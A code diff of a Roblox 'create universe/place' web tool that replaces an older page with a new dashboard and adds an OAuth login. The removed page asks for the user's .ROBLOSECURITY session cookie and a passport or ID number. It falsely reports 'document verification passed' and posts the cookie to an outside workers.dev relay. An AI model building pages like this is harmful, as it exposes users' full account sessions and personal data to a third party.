@@ -3,601 +3,834 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>EZ Publish Service</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <title>Studio Cloud</title>
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-
-    body {
-      font-family: 'Inter', sans-serif;
-      background: #f5f5f5;
-      color: #1a1a1a;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
+    :root {
+      --bg-main: #0d1117;
+      --bg-sidebar: #161b22;
+      --bg-card: #21262d;
+      --border-color: #30363d;
+      --text-main: #c9d1d9;
+      --text-heading: #f0f6fc;
+      --text-muted: #8b949e;
+      --primary: #238636;
+      --primary-hover: #2ea043;
+      --blue: #2f81f7;
+      --radius: 8px;
     }
 
-    .topbar {
-      background: #fff;
-      border-bottom: 1px solid #e0e0e0;
-      padding: 0 32px;
-      height: 56px;
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: var(--bg-main);
+      color: var(--text-main);
+      display: flex;
+      height: 100vh;
+      width: 100vw;
+      overflow: hidden;
+    }
+
+    /* Custom Toast Notifications */
+    .toast-container {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      max-width: clamp(280px, 80vw, 360px);
+      width: 100%;
+      pointer-events: none;
+    }
+
+    .toast {
+      pointer-events: auto;
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      border-left: 4px solid var(--blue);
+      border-radius: var(--radius);
+      padding: 12px 16px;
+      color: var(--text-heading);
+      font-size: clamp(0.8rem, 1vw, 0.88rem);
       display: flex;
       align-items: center;
       justify-content: space-between;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+      animation: slideIn 0.3s ease forwards;
     }
 
-    .topbar-title { font-size: 15px; font-weight: 600; }
-    .topbar-sub { font-size: 12px; color: #999; }
+    .toast.success { border-left-color: #238636; }
+    .toast.error { border-left-color: #da3633; }
+    .toast.warning { border-left-color: #d29922; }
+    .toast.info { border-left-color: #2f81f7; }
 
-    .user-badge {
+    .toast-content {
       display: flex;
       align-items: center;
       gap: 10px;
-      font-size: 12px;
-      font-weight: 500;
     }
 
-    .verify-tag {
-      background: #dcfce7;
-      color: #15803d;
-      padding: 2px 8px;
-      border-radius: 12px;
-      font-size: 11px;
-      font-weight: 600;
-    }
-
-    .btn-logout {
-      background: none;
-      border: 1px solid #e0e0e0;
-      padding: 4px 10px;
-      border-radius: 4px;
-      font-size: 11px;
+    .toast-close {
+      background: transparent;
+      border: none;
+      color: var(--text-muted);
       cursor: pointer;
-      color: #666;
+      font-size: 1rem;
+      padding: 0 4px;
     }
 
-    .btn-logout:hover {
-      background: #f0f0f0;
-      color: #1a1a1a;
+    .toast-close:hover {
+      color: var(--text-heading);
     }
 
-    .container {
-      max-width: 600px;
-      margin: 40px auto;
-      padding: 0 20px;
-      width: 100%;
+    @keyframes slideIn {
+      from { transform: translateX(100%); opacity: 0; }
+      to { transform: translateX(0); opacity: 1; }
+    }
+
+    @keyframes fadeOut {
+      to { transform: translateX(100%); opacity: 0; }
+    }
+
+    /* Scaled Sidebar Styles */
+    .sidebar {
+      width: clamp(200px, 20vw, 280px);
+      min-width: 180px;
+      background-color: var(--bg-sidebar);
+      border-right: 1px solid var(--border-color);
+      display: flex;
+      flex-direction: column;
+      transition: width 0.25s ease, min-width 0.25s ease;
+      white-space: nowrap;
+      overflow: hidden;
+      flex-shrink: 0;
+    }
+
+    .sidebar.collapsed {
+      width: clamp(50px, 5vw, 64px);
+      min-width: 50px;
+    }
+
+    .sidebar-header {
+      padding: clamp(12px, 1.5vh, 18px);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid var(--border-color);
+    }
+
+    .brand-title {
+      font-size: clamp(0.95rem, 1.2vw, 1.15rem);
+      font-weight: 700;
+      color: var(--text-heading);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .toggle-btn {
+      background: transparent;
+      border: none;
+      color: var(--text-muted);
+      font-size: clamp(1rem, 1.2vw, 1.3rem);
+      cursor: pointer;
+      padding: 6px 8px;
+      border-radius: var(--radius);
+    }
+
+    .toggle-btn:hover {
+      background: var(--bg-card);
+      color: var(--text-heading);
+    }
+
+    .menu {
+      list-style: none;
+      padding: 12px 8px;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
       flex: 1;
     }
 
-    .gate-card {
-      background: #fff;
-      border: 1px solid #e0e0e0;
-      border-radius: 8px;
-      padding: 32px 24px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.03);
-    }
-
-    .gate-title {
-      font-size: 18px;
-      font-weight: 700;
-      margin-bottom: 8px;
-      text-align: center;
-    }
-
-    .gate-desc {
-      font-size: 13px;
-      color: #666;
-      margin-bottom: 24px;
-      line-height: 1.5;
-      text-align: center;
-    }
-
-    .tabs {
+    .menu-item {
       display: flex;
-      background: #fff;
-      border: 1px solid #e0e0e0;
-      border-radius: 8px 8px 0 0;
-      border-bottom: none;
+      align-items: center;
+      gap: 12px;
+      padding: clamp(8px, 1.2vh, 12px) 12px;
+      color: var(--text-muted);
+      border-radius: var(--radius);
+      cursor: pointer;
+      font-size: clamp(0.82rem, 0.9vw, 0.92rem);
+      font-weight: 500;
+      transition: all 0.2s;
+    }
+
+    .menu-item:hover, .menu-item.active {
+      background: var(--bg-card);
+      color: var(--text-heading);
+    }
+
+    .menu-item .icon {
+      font-size: clamp(1rem, 1.1vw, 1.2rem);
+      min-width: 24px;
+      text-align: center;
+    }
+
+    /* Roblox Auth Footer */
+    .sidebar-footer {
+      padding: clamp(8px, 1.2vh, 14px);
+      border-top: 1px solid var(--border-color);
+    }
+
+    .btn-roblox-login {
+      width: 100%;
+      background: #000000;
+      border: 1px solid var(--border-color);
+      color: #ffffff;
+      padding: clamp(8px, 1vh, 11px);
+      border-radius: var(--radius);
+      font-weight: 600;
+      font-size: clamp(0.78rem, 0.85vw, 0.88rem);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: background 0.2s, border-color 0.2s;
+    }
+
+    .btn-roblox-login:hover {
+      background: #111;
+      border-color: var(--blue);
+    }
+
+    .user-profile {
+      display: none;
+      align-items: center;
+      justify-content: space-between;
+      background: var(--bg-card);
+      padding: 8px 12px;
+      border-radius: var(--radius);
+      border: 1px solid var(--border-color);
+    }
+
+    .user-info {
+      display: flex;
+      align-items: center;
+      gap: 10px;
       overflow: hidden;
     }
 
-    .tab {
-      padding: 14px 24px;
-      font-size: 13px;
-      font-weight: 500;
-      color: #888;
-      background: none;
-      border: none;
-      border-bottom: 2px solid transparent;
-      cursor: pointer;
-      transition: all 0.15s;
-      font-family: 'Inter', sans-serif;
+    .avatar {
+      width: clamp(24px, 2vw, 28px);
+      height: clamp(24px, 2vw, 28px);
+      border-radius: 50%;
+      background: var(--blue);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      font-size: 0.75rem;
+      color: #fff;
+      flex-shrink: 0;
     }
 
-    .tab.active { color: #1a1a1a; border-bottom-color: #e5172d; }
-    .tab:hover:not(.active) { color: #444; }
+    .username {
+      font-size: clamp(0.78rem, 0.85vw, 0.88rem);
+      font-weight: 600;
+      color: var(--text-heading);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
 
-    .panel { display: none; }
-    .panel.active { display: block; }
+    .btn-logout {
+      background: transparent;
+      border: none;
+      color: var(--text-muted);
+      cursor: pointer;
+      font-size: 0.9rem;
+    }
+
+    .btn-logout:hover {
+      color: #f85149;
+    }
+
+    /* Main Content Area */
+    .main-content {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      overflow-y: auto;
+      padding: clamp(16px, 3vw, 36px);
+    }
+
+    .page {
+      display: none;
+      max-width: 650px;
+      margin: 0 auto;
+      width: 100%;
+    }
+
+    .page.active {
+      display: block;
+    }
+
+    .page-title {
+      font-size: clamp(1.25rem, 1.8vw, 1.65rem);
+      color: var(--text-heading);
+      margin-bottom: 8px;
+    }
+
+    .page-subtitle {
+      font-size: clamp(0.8rem, 0.9vw, 0.9rem);
+      color: var(--text-muted);
+      margin-bottom: 24px;
+    }
 
     .card {
-      background: #fff;
-      border: 1px solid #e0e0e0;
-      border-radius: 0 0 8px 8px;
-      padding: 24px;
+      background: var(--bg-sidebar);
+      border: 1px solid var(--border-color);
+      border-radius: var(--radius);
+      padding: clamp(16px, 2.5vw, 28px);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
     }
 
-    .field { margin-bottom: 18px; }
-
-    .field label {
-      display: block;
-      font-size: 12px;
-      font-weight: 500;
-      color: #555;
-      margin-bottom: 6px;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
+    .auth-banner {
+      background: rgba(47, 129, 247, 0.1);
+      border: 1px solid rgba(47, 129, 247, 0.3);
+      padding: 10px 14px;
+      border-radius: var(--radius);
+      margin-bottom: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: clamp(0.78rem, 0.85vw, 0.88rem);
     }
 
-    .field input, .field select {
-      width: 100%;
-      padding: 10px 12px;
-      font-size: 13px;
-      font-family: 'Inter', sans-serif;
-      border: 1px solid #ddd;
-      border-radius: 6px;
-      background: #fafafa;
-      color: #1a1a1a;
-      outline: none;
-      transition: border-color 0.15s;
-    }
-
-    .field input:focus, .field select:focus { border-color: #e5172d; background: #fff; }
-    .field input::placeholder { color: #bbb; }
-    .field .hint { font-size: 11px; color: #aaa; margin-top: 5px; }
-
-    .row {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 16px;
+    .form-group {
       margin-bottom: 18px;
     }
 
-    .row .field { margin-bottom: 0; }
-
-    .divider {
-      border: none;
-      border-top: 1px solid #f0f0f0;
-      margin: 20px 0;
-    }
-
-    .status-row {
+    label {
       display: flex;
-      align-items: center;
-      gap: 8px;
-      margin-bottom: 12px;
-      font-size: 12px;
-      color: #888;
+      justify-content: space-between;
+      font-size: clamp(0.78rem, 0.85vw, 0.88rem);
+      color: var(--text-heading);
+      margin-bottom: 6px;
+      font-weight: 500;
     }
 
-    .dot {
-      width: 8px; height: 8px;
-      border-radius: 50%;
-      background: #ddd;
-      flex-shrink: 0;
-    }
-    .dot.running { background: #22c55e; animation: blink 1s infinite; }
-    .dot.done    { background: #22c55e; }
-    .dot.error   { background: #f87171; }
+    .badge-req { color: #f85149; font-size: 0.75rem; }
+    .badge-opt { color: var(--text-muted); font-size: 0.75rem; }
 
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.3; }
-    }
-
-    .progress-bar-wrap {
-      height: 4px;
-      background: #f0f0f0;
-      border-radius: 2px;
-      margin-bottom: 20px;
-      overflow: hidden;
+    input[type="text"],
+    input[type="number"],
+    input[type="password"] {
+      width: 100%;
+      padding: clamp(8px, 1vh, 11px) 12px;
+      background: var(--bg-main);
+      border: 1px solid var(--border-color);
+      border-radius: var(--radius);
+      color: var(--text-heading);
+      font-size: clamp(0.82rem, 0.9vw, 0.92rem);
+      outline: none;
     }
 
-    .progress-bar-fill {
-      height: 100%;
-      background: #e5172d;
-      border-radius: 2px;
-      width: 0%;
-      transition: width 0.3s;
+    input:focus {
+      border-color: var(--blue);
     }
 
-    .btn-row { display: flex; gap: 10px; }
-
-    .btn {
-      padding: 11px 20px;
-      font-size: 13px;
+    .btn-action {
+      width: 100%;
+      padding: clamp(10px, 1.2vh, 14px);
+      background: var(--primary);
+      color: #fff;
+      border: none;
+      border-radius: var(--radius);
       font-weight: 600;
-      font-family: 'Inter', sans-serif;
-      border: none;
-      border-radius: 6px;
+      font-size: clamp(0.85rem, 0.95vw, 0.98rem);
       cursor: pointer;
-      transition: background 0.15s;
-    }
-
-    .btn-primary { background: #e5172d; color: #fff; flex: 1; }
-    .btn-primary:hover { background: #c0121f; }
-    .btn-primary:disabled { background: #f5c0c5; cursor: not-allowed; }
-
-    .btn-secondary { background: #f0f0f0; color: #555; }
-    .btn-secondary:hover { background: #e5e5e5; }
-
-    .log-box {
-      background: #111;
-      border-radius: 6px;
-      height: 320px;
-      overflow-y: auto;
-      padding: 14px;
-      font-family: 'Courier New', monospace;
-      font-size: 11px;
-      line-height: 1.9;
-      scrollbar-width: thin;
-      scrollbar-color: #333 transparent;
-    }
-
-    .log-line { display: flex; gap: 10px; }
-    .log-ts   { color: #444; flex-shrink: 0; }
-    .log-ok   { color: #22c55e; }
-    .log-err  { color: #f87171; }
-    .log-info { color: #f59e0b; }
-
-    .log-actions {
-      display: flex;
-      justify-content: flex-end;
       margin-top: 10px;
+      transition: background 0.2s;
     }
 
-    .btn-link {
-      background: none;
-      border: none;
-      font-size: 12px;
-      color: #aaa;
-      cursor: pointer;
-      font-family: 'Inter', sans-serif;
+    .btn-action:hover {
+      background: var(--primary-hover);
     }
-    .btn-link:hover { color: #555; }
 
-    footer {
-      text-align: center;
-      font-size: 11px;
-      color: #bbb;
-      margin-top: 32px;
-      padding-bottom: 40px;
+    .console-box {
+      background: var(--bg-main);
+      border: 1px solid var(--border-color);
+      border-radius: var(--radius);
+      padding: 16px;
+      font-family: monospace;
+      font-size: 0.85rem;
+      color: #7ee787;
+      height: clamp(250px, 45vh, 450px);
+      overflow-y: auto;
+      white-space: pre-wrap;
     }
   </style>
 </head>
 <body>
 
-<div class="topbar">
-  <div>
-    <span class="topbar-title">EZ Publish Service</span>
-    <span class="topbar-sub">Roblox Universe and Place Tool</span>
-  </div>
-  <div class="user-badge" id="userContainer" style="display: none;">
-    <span id="userStatusLabel">Session Active</span>
-    <span class="verify-tag" id="verifyBadge">✓ Verified Doc</span>
-    <button class="btn-logout" onclick="logout()">Logout</button>
-  </div>
-</div>
+  <div class="toast-container" id="toastContainer"></div>
 
-<div class="container">
+  <aside class="sidebar" id="sidebar">
+    <div class="sidebar-header">
+      <div class="brand-title">
+        <span>☁️</span> <span class="nav-text">Studio Cloud</span>
+      </div>
+      <button class="toggle-btn" id="toggleSidebar" title="Toggle Sidebar">☰</button>
+    </div>
 
-  <div id="gate-screen" class="gate-card">
-    <h2 class="gate-title">System Access Gate</h2>
-    <p class="gate-desc">Enter your Roblox Security Cookie and complete mandatory document verification to access the service.</p>
+    <ul class="menu">
+      <li class="menu-item active" onclick="switchPage('create-place', this)">
+        <span class="icon">➕</span>
+        <span class="nav-text">Create Place</span>
+      </li>
+      <li class="menu-item" onclick="switchPage('create-universe', this)">
+        <span class="icon">🌌</span>
+        <span class="nav-text">Create Universe</span>
+      </li>
+      <li class="menu-item" onclick="switchPage('console-logs', this)">
+        <span class="icon">📟</span>
+        <span class="nav-text">Console Logs</span>
+      </li>
+    </ul>
+
+    <div class="sidebar-footer">
+      <button class="btn-roblox-login" id="robloxLoginBtn">
+        <span>🔴</span> <span class="nav-text">Login with Roblox</span>
+      </button>
+
+      <div class="user-profile" id="userProfile">
+        <div class="user-info">
+          <div class="avatar" id="userAvatar">R</div>
+          <span class="username nav-text" id="usernameLabel">RobloxUser</span>
+        </div>
+        <button class="btn-logout" onclick="logoutRoblox()" title="Logout">✕</button>
+      </div>
+    </div>
+  </aside>
+
+  <main class="main-content">
     
-    <div class="field">
-      <label>Roblox Security Cookie (.ROBLOSECURITY)</label>
-      <input type="password" id="gate-cookie" placeholder="Paste your .ROBLOSECURITY cookie here" autocomplete="off" autocorrect="off" spellcheck="false" />
-      <div class="hint">Your cookie is stored locally during the active session only.</div>
-    </div>
+    <section id="create-place" class="page active">
+      <h1 class="page-title">Create Place</h1>
+      <p class="page-subtitle">Add a new place to an existing Roblox Universe.</p>
 
-    <div class="field">
-      <label>Document Verification Type</label>
-      <select id="gate-doc-type">
-        <option value="id_card">Identity Card (RG / ID)</option>
-        <option value="passport">Passport</option>
-        <option value="driver_license">Driver's License</option>
-      </select>
-    </div>
-
-    <div class="field">
-      <label>Document Identification Number / Verification Check</label>
-      <input type="text" id="gate-doc-id" placeholder="Enter document number for verification" />
-      <div class="hint">Mandatory identity verification before entering the site.</div>
-    </div>
-
-    <button class="btn btn-primary" style="width: 100%; margin-top: 10px;" onclick="loginWithCookie()">Verify & Enter Dashboard</button>
-  </div>
-
-  <div id="app-screen" style="display: none;">
-    <div class="tabs">
-      <button class="tab active" onclick="switchTab('universe')">Create Universe</button>
-      <button class="tab" onclick="switchTab('place')">Create Place</button>
-      <button class="tab" onclick="switchTab('log')">Log</button>
-    </div>
-
-    <div id="panel-universe" class="panel active">
       <div class="card">
-        <div class="field">
-          <label>Template Place ID</label>
-          <input type="text" id="u-template" value="95206881" />
-          <div class="hint">Default is 95206881 (baseplate).</div>
+        <div class="auth-banner">
+          <span>🔒 Login with Roblox or enter .ROBLOSECURITY / API Key below.</span>
+          <button class="btn-roblox-login authPageBtn" style="width: auto; padding: 4px 10px;">Auth</button>
         </div>
-        <div class="row">
-          <div class="field">
-            <label>Number to Create</label>
-            <input type="number" id="u-count" value="1" min="1" max="50" />
-          </div>
-          <div class="field">
-            <label>Delay Between Requests (s)</label>
-            <input type="number" id="u-delay" value="1" min="0.5" max="10" step="0.5" />
-          </div>
-        </div>
-        <hr class="divider" />
-        <div class="status-row">
-          <div class="dot" id="u-dot"></div>
-          <span id="u-status">Ready</span>
-        </div>
-        <div class="progress-bar-wrap">
-          <div class="progress-bar-fill" id="u-bar"></div>
-        </div>
-        <div class="btn-row">
-          <button class="btn btn-primary" id="u-btn" onclick="runUniverses()">Start Creating</button>
-          <button class="btn btn-secondary" onclick="stop()">Stop</button>
-        </div>
-      </div>
-    </div>
 
-    <div id="panel-place" class="panel">
+        <div class="form-group">
+          <label>Roblox Security Cookie / API Key <span class="badge-req">Required</span></label>
+          <input type="password" id="place-key" placeholder="Paste .ROBLOSECURITY or API Key" />
+        </div>
+
+        <div class="form-group">
+          <label>Universe ID <span class="badge-req">Required</span></label>
+          <input type="text" id="place-universe-id" placeholder="e.g. 123456789" />
+        </div>
+
+        <div class="form-group">
+          <label>Template ID (Uncopylocked) <span class="badge-opt">Optional</span></label>
+          <input type="text" id="place-template-id" value="95206881" placeholder="95206881 (Baseplate)" />
+        </div>
+
+        <div class="form-group">
+          <label>Number to Create <span class="badge-opt">Optional</span></label>
+          <input type="number" id="place-count" value="1" min="1" max="100" />
+        </div>
+
+        <div class="form-group">
+          <label>Delay Between Requests (seconds) <span class="badge-opt">Optional</span></label>
+          <input type="number" id="place-delay" value="1" min="0" step="0.5" />
+        </div>
+
+        <button class="btn-action" id="btn-create-place" onclick="handleCreatePlace()">Execute Create Place</button>
+      </div>
+    </section>
+
+    <section id="create-universe" class="page">
+      <h1 class="page-title">Create Universe</h1>
+      <p class="page-subtitle">Generate new Roblox Universes automatically.</p>
+
       <div class="card">
-        <div class="field">
-          <label>Universe ID</label>
-          <input type="text" id="p-universe" placeholder="e.g. 123456789" />
+        <div class="auth-banner">
+          <span>🔒 Login with Roblox or enter .ROBLOSECURITY / API Key below.</span>
+          <button class="btn-roblox-login authPageBtn" style="width: auto; padding: 4px 10px;">Auth</button>
         </div>
-        <div class="field">
-          <label>Template Place ID</label>
-          <input type="text" id="p-template" value="95206881" />
-          <div class="hint">Default is 95206881 (baseplate).</div>
+
+        <div class="form-group">
+          <label>Roblox Security Cookie / API Key <span class="badge-req">Required</span></label>
+          <input type="password" id="universe-key" placeholder="Paste .ROBLOSECURITY or API Key" />
         </div>
-        <div class="row">
-          <div class="field">
-            <label>Number to Create</label>
-            <input type="number" id="p-count" value="1" min="1" max="50" />
-          </div>
-          <div class="field">
-            <label>Delay Between Requests (s)</label>
-            <input type="number" id="p-delay" value="1" min="0.5" max="10" step="0.5" />
-          </div>
+
+        <div class="form-group">
+          <label>Template ID (Uncopylocked) <span class="badge-opt">Optional</span></label>
+          <input type="text" id="universe-template-id" value="95206881" placeholder="95206881 (Baseplate)" />
         </div>
-        <hr class="divider" />
-        <div class="status-row">
-          <div class="dot" id="p-dot"></div>
-          <span id="p-status">Ready</span>
+
+        <div class="form-group">
+          <label>Number to Create <span class="badge-opt">Optional</span></label>
+          <input type="number" id="universe-count" value="1" min="1" max="100" />
         </div>
-        <div class="progress-bar-wrap">
-          <div class="progress-bar-fill" id="p-bar"></div>
+
+        <div class="form-group">
+          <label>Delay Between Requests (seconds) <span class="badge-opt">Optional</span></label>
+          <input type="number" id="universe-delay" value="1" min="0" step="0.5" />
         </div>
-        <div class="btn-row">
-          <button class="btn btn-primary" id="p-btn" onclick="runPlaces()">Start Creating</button>
-          <button class="btn btn-secondary" onclick="stop()">Stop</button>
-        </div>
+
+        <button class="btn-action" id="btn-create-universe" onclick="handleCreateUniverse()">Execute Create Universe</button>
       </div>
-    </div>
+    </section>
 
-    <div id="panel-log" class="panel">
-      <div class="card" style="border-radius:8px;">
-        <div class="log-box" id="log"></div>
-        <div class="log-actions">
-          <button class="btn-link" onclick="clearLog()">Clear log</button>
-        </div>
+    <section id="console-logs" class="page">
+      <h1 class="page-title">Console Logs</h1>
+      <p class="page-subtitle">Real-time system activity and output logs.</p>
+
+      <div class="card">
+        <div class="console-box" id="consoleBox">[INFO] Studio Cloud initialized.
+[INFO] Waiting for action...</div>
       </div>
-    </div>
-  </div>
+    </section>
 
-  <footer>EZ Publish Service | Made with love by Axo</footer>
+  </main>
 
-</div>
+  <script>
+    const WORKER_URL = 'https://ezpublishserv.acc943132.workers.dev/';
 
-<script>
-  const WORKER_URL = 'https://ezpublishserv.acc943132.workers.dev/';
-  let running = false;
-  let activeCookie = '';
+    // --- CONFIGURAÇÃO OAUTH ROBLOX ---
+    const CLIENT_ID = "COLE_AQUI_O_CLIENT_ID_DO_ROBLOX"; 
+    const REDIRECT_URI = "https://jardel124.github.io/Studio-Cloud-API/";
 
-  function loginWithCookie() {
-    const cookieEl = document.getElementById('gate-cookie');
-    const docEl = document.getElementById('gate-doc-id');
-    const cookie = cookieEl.value.trim();
-    const docId = docEl.value.trim();
+    const ROBLOX_AUTH_URL = "https://apis.roblox.com/oauth/v1/authorize";
+    const ROBLOX_TOKEN_URL = "https://apis.roblox.com/oauth/v1/token";
+    const ROBLOX_USERINFO_URL = "https://apis.roblox.com/oauth/v1/userinfo";
 
-    if (!cookie) {
-      alert('Please enter your .ROBLOSECURITY cookie.');
-      return;
+    // --- HELPER DE DELAY ---
+    const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+    // --- WORKER API REQUEST ---
+    async function callWorker(payload) {
+      const resp = await fetch(WORKER_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      });
+
+      if (resp.status === 429) {
+        const retryAfter = resp.headers.get('Retry-After') || '60';
+        return { ok: false, message: 'Rate limited. Retry after ' + retryAfter + 's.' };
+      }
+      if (resp.status === 403) {
+        return { ok: false, message: 'Request blocked by worker (origin not allowed).' };
+      }
+
+      return resp.json();
     }
-    if (!docId) {
-      alert('Please enter document identification for verification.');
-      return;
+
+    // --- PKCE & STATE HELPER FUNCTIONS ---
+    function dec2hex(dec) { return ('0' + dec.toString(16)).slice(-2); }
+    function generateRandomString() {
+      var array = new Uint32Array(56);
+      window.crypto.getRandomValues(array);
+      return Array.from(array, dec2hex).join('');
+    }
+    async function sha256(plain) {
+      const encoder = new TextEncoder();
+      const data = encoder.encode(plain);
+      return window.crypto.subtle.digest('SHA-256', data);
+    }
+    function base64urlencode(a) {
+      var str = "";
+      var bytes = new Uint8Array(a);
+      var len = bytes.byteLength;
+      for (var i = 0; i < len; i++) { str += String.fromCharCode(bytes[i]); }
+      return btoa(str).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
+    }
+    async function generateCodeChallenge(v) {
+      const hashed = await sha256(v);
+      return base64urlencode(hashed);
     }
 
-    activeCookie = cookie;
-    sessionStorage.setItem('active_cookie', cookie);
-    sessionStorage.setItem('verified_doc', docId);
+    // --- TOAST NOTIFICATIONS ---
+    function notify(message, type = 'info') {
+      const container = document.getElementById('toastContainer');
+      const toast = document.createElement('div');
+      toast.className = `toast ${type}`;
 
-    cookieEl.value = '';
-    docEl.value = '';
+      const icons = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
 
-    showApp();
-    log('Login successful. Document verification passed.', 'ok');
-  }
+      toast.innerHTML = `
+        <div class="toast-content">
+          <span>${icons[type] || 'ℹ️'}</span>
+          <span>${message}</span>
+        </div>
+        <button class="toast-close" onclick="this.parentElement.remove()">✕</button>
+      `;
 
-  function showApp() {
-    document.getElementById('gate-screen').style.display = 'none';
-    document.getElementById('app-screen').style.display = 'block';
-    document.getElementById('userContainer').style.display = 'flex';
-  }
+      container.appendChild(toast);
 
-  function logout() {
-    activeCookie = '';
-    sessionStorage.removeItem('active_cookie');
-    sessionStorage.removeItem('verified_doc');
-    document.getElementById('app-screen').style.display = 'none';
-    document.getElementById('userContainer').style.display = 'none';
-    document.getElementById('gate-screen').style.display = 'block';
-  }
-
-  window.addEventListener('DOMContentLoaded', () => {
-    const savedCookie = sessionStorage.getItem('active_cookie');
-    if (savedCookie) {
-      activeCookie = savedCookie;
-      showApp();
-      log('Session restored.', 'info');
+      setTimeout(() => {
+        toast.style.animation = 'fadeOut 0.3s ease forwards';
+        setTimeout(() => toast.remove(), 300);
+      }, 4000);
     }
-  });
 
-  function switchTab(id) {
-    document.querySelectorAll('.tab').forEach((t, i) => {
-      t.classList.toggle('active', ['universe', 'place', 'log'][i] === id);
-    });
-    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
-    document.getElementById('panel-' + id).classList.add('active');
-  }
-
-  function log(msg, type = 'info') {
-    const box = document.getElementById('log');
-    const ts = new Date().toTimeString().slice(0, 8);
-    const line = document.createElement('div');
-    line.className = 'log-line';
-    const tsSpan = document.createElement('span');
-    tsSpan.className = 'log-ts';
-    tsSpan.textContent = '[' + ts + ']';
-    const msgSpan = document.createElement('span');
-    msgSpan.className = 'log-' + type;
-    msgSpan.textContent = msg;
-    line.appendChild(tsSpan);
-    line.appendChild(msgSpan);
-    box.appendChild(line);
-    box.scrollTop = box.scrollHeight;
-  }
-
-  function clearLog() {
-    document.getElementById('log').innerHTML = '';
-  }
-
-  function setStatus(prefix, text, state) {
-    document.getElementById(prefix + '-status').textContent = text;
-    document.getElementById(prefix + '-dot').className = 'dot' + (state ? ' ' + state : '');
-  }
-
-  function setProgress(prefix, val, total) {
-    document.getElementById(prefix + '-bar').style.width =
-      (total ? Math.round((val / total) * 100) : 0) + '%';
-  }
-
-  function stop() {
-    running = false;
-    log('Stop requested.', 'info');
-  }
-
-  const sleep = ms => new Promise(r => setTimeout(r, ms));
-
-  async function callWorker(payload) {
-    const resp = await fetch(WORKER_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload),
+    // --- UI & NAVIGATION ---
+    const sidebar = document.getElementById('sidebar');
+    document.getElementById('toggleSidebar').addEventListener('click', () => {
+      sidebar.classList.toggle('collapsed');
     });
 
-    if (resp.status === 429) {
-      const retryAfter = resp.headers.get('Retry-After') || '60';
-      return { ok: false, message: 'Rate limited. Try again in ' + retryAfter + 's.' };
+    function switchPage(pageId, element) {
+      document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
+      document.querySelectorAll('.menu-item').forEach(item => item.classList.remove('active'));
+      
+      document.getElementById(pageId).classList.add('active');
+      if (element) element.classList.add('active');
     }
-    if (resp.status === 403) {
-      return { ok: false, message: 'Request blocked by worker (origin not allowed).' };
+
+    function appendLog(message, type = 'INFO') {
+      const consoleBox = document.getElementById('consoleBox');
+      const timestamp = new Date().toLocaleTimeString();
+      consoleBox.innerText += `\n[${timestamp}] [${type}] ${message}`;
+      consoleBox.scrollTop = consoleBox.scrollHeight;
     }
 
-    return resp.json();
-  }
-
-  async function runUniverses() {
-    if (!activeCookie) { alert('Session invalid. Please log in again.'); logout(); return; }
-
-    const template = parseInt(document.getElementById('u-template').value) || 95206881;
-    const count    = parseInt(document.getElementById('u-count').value)    || 1;
-    const delay    = parseFloat(document.getElementById('u-delay').value)  || 1;
-
-    running = true;
-    switchTab('log');
-    document.getElementById('u-btn').disabled = true;
-    setProgress('u', 0, count);
-
-    let ok = 0, err = 0;
-    for (let i = 1; i <= count; i++) {
-      if (!running) { log('Stopped by user.', 'info'); break; }
-      setStatus('u', 'Creating universe ' + i + ' of ' + count + '...', 'running');
-      try {
-        const res = await callWorker({ action: 'createUniverse', cookie: activeCookie, templateId: template });
-        log('[Universe ' + i + '/' + count + '] ' + res.message, res.ok ? 'ok' : 'err');
-        res.ok ? ok++ : err++;
-      } catch (e) {
-        log('[Universe ' + i + '/' + count + '] Request failed.', 'err');
-        err++;
+    // --- FLUXO DE LOGIN ROBLOX ---
+    async function startRobloxAuth() {
+      if (!CLIENT_ID || CLIENT_ID.includes("COLE_AQUI")) {
+        notify("Configure o CLIENT_ID no código para usar o login real!", "warning");
+        appendLog("OAuth cancelado: CLIENT_ID não configurado.", "WARN");
+        return;
       }
-      setProgress('u', i, count);
-      if (i < count && running) await sleep(delay * 1000);
+
+      const codeVerifier = generateRandomString();
+      const codeChallenge = await generateCodeChallenge(codeVerifier);
+      const state = generateRandomString();
+      
+      localStorage.setItem("roblox_verifier", codeVerifier);
+      localStorage.setItem("roblox_state", state);
+
+      const authUrl = `${ROBLOX_AUTH_URL}?` +
+        `client_id=${CLIENT_ID}&` +
+        `redirect_uri=${encodeURIComponent(REDIRECT_URI)}&` +
+        `response_type=code&` +
